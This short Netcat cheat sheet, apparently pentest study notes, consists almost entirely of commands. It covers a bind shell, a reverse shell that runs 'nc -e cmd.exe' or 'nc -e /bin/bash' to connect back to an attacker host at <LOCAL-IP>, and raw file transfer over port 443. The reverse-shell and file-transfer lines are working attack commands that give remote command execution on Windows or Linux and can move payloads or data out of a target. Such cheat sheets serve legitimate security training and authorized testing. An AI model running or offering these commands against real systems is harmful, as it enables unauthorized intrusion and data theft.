# Netcat


**Basic bind shell:**
```sh
nc -nvlp 443           # On local Kali
nc -nv <REMOTE-IP> 443 # On remote
```

**Basic reverse shell:**
```sh
sudo nc -nlvp 443                  # On local Kali
nc -nv <LOCAL-IP> 443 -e cmd.exe   # On remote Windows
nc -nv <LOCAL-IP> 443 -e /bin/bash # On remote Linux
```

**Sending files:**
```sh
sudo nc -nvlp 443 > incoming.exe     # Reciever
nc -nv <LOCAL-IP> 443 < incoming.exe # Sender
```
